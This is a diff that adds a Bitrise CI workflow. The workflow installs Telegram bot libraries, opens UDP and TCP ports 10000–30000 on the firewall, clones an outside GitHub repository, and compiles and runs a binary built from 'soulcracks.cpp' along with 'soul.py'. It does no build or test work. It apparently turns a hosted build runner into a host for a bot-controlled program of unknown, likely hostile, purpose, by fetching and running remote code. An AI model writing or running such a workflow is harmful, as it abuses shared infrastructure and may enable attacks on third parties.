@@ -1,0 +1,44 @@
+format_version: '13'
+default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git
+
+workflows:
+  run_python_file:
+    steps:
+      - script:
+          title: Update and install dependencies
+          inputs:
+            - content: | 
+                #!/bin/bash
+                sudo apt update
+                sudo apt install -y g++
+                sudo apt install -y python3-pip
+                pip3 install pymongo aiohttp TelegramBotAPI telebot
+      - script:
+          title: Configure UFW firewall
+          inputs:
+            - content: |
+                #!/bin/bash
+                sudo apt install -y ufw
+                sudo ufw enable
+                sudo ufw allow ssh
+                sudo ufw allow http
+                sudo ufw allow https
+                sudo ufw allow 10000:30000/udp
+                sudo ufw allow 10000:30000/tcp
+                sudo ufw status
+      - script:
+          title: Configure Reposatory
+          inputs:
+            - content: |
+                #!/bin/bash
+                git clone https://github.com/bobby623974/Anoy1764.git
+                cd Anoy1764
+                g++ -std=c++14 soulcracks.cpp -o soul -pthread
+                mv soul /bitrise/src/soul
+                mv soul.py /bitrise/src/soul.py
+      - script:
+          title: Run Python script
+          inputs:
+            - content: |
+                #!/bin/bash
+                python3 soul.py
